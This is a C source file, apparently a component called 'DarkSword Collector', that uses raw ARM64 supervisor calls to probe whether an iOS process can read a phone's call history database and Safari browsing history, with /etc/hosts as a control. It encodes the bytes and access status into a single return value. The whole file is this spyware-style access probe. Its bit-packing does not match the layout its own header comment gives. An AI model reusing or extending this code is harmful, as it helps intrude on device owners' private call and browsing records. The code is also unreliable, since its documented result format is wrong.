/**
 * DarkSword Collector v23 - Read 1 byte each from 3 files
 * bits 0-7: CallHistory byte
 * bits 8-15: Safari byte  
 * bits 16-23: /etc/hosts byte (control)
 * bits 24-25: CallHistory status (00=denied, 01=open_only, 11=read_ok)
 * bits 26-27: Safari status
 * bits 28-29: hosts status
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

static int _read1(const char *path, unsigned char *out) {
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0;
    int n = (int)_svc3(SYS_read, fd, (long)out, 1);
    _svc1(SYS_close, fd);
    return (n > 0) ? 3 : 1;
}

int ds_start(void) {
    unsigned char ch = 0;
    int s;

    s = _read1("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", &ch);
    int result = (int)ch | (s << 8);

    s = _read1("/var/mobile/Library/Safari/History.db", &ch);
    result |= ((int)ch << 10) | (s << 18);

    s = _read1("/etc/hosts", &ch);
    result |= ((int)ch << 20) | (s << 28);

    return result;
}
